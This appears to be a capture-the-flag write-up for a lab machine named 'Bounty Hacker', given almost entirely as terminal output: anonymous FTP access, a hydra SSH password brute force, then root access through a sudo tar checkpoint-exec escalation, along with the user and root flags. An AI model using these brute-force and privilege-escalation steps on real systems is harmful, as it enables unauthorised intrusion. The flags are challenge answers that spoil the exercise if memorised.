# Bounty Hacker Writeup
```

root@ip-10-10-107-242:~# ftp 10.10.76.136
Connected to 10.10.76.136.
220 (vsFTPd 3.0.3)
Name (10.10.76.136:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07 20:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 20:47 task.txt
226 Directory send OK.
ftp> mget locks.txt
mget locks.txt? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.05 secs (8.3518 kB/s)
ftp> mget task.txt
mget task.txt? 
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (1.6212 MB/s)
ftp> quit
221 Goodbye.

hydra -vV -l lin -P locks.txt 10.10.76.136 -t 4 ssh
[ATTEMPT] target 10.10.76.136 - login "lin" - pass "RedDr4gonSynd1cat3" - 10 of 26 [child 1] (0/0)
[ATTEMPT] target 10.10.76.136 - login "lin" - pass "R3dDRaG0Nsynd1c@T3" - 11 of 26 [child 0] (0/0)
[ATTEMPT] target 10.10.76.136 - login "lin" - pass "Synd1c4teDr@g0n" - 12 of 26 [child 3] (0/0)
[22][ssh] host: 10.10.76.136   login: lin   password: RedDr4gonSynd1cat3

ssh lin@10.10.76.136
lin@10.10.76.136's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Fri Dec  4 16:48:52 2020 from 10.11.22.251
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}

local privilege escalation

lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# l
/bin/sh: 3: l: not found
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}
# 
```
